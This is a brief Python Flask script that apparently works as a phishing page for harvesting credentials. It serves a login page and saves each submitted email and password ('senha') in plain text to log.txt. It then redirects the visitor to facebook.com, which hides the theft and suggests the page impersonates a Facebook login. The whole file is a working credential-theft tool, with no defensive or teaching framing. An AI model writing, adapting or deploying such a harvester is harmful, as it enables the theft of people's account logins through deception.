from flask import Flask, request, redirect

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        senha = request.form.get("senha")
        with open("log.txt", "a") as f:
            f.write(f"{email} | {senha}\n")
        return redirect("https://facebook.com")
    return open("index.html").read()

if __name__ == "__main__":
    app.run()
